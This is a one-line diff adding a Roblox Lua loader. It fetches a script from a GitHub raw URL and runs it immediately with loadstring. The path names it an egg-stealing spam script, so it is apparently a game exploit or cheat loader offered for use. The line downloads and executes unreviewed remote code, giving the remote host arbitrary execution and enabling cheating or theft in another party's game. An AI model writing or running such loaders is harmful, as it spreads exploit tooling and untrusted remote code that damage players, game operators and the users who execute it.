@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/clone-to-steal-eggs-spam2-7ggn8gkejnzusz.lua"))()
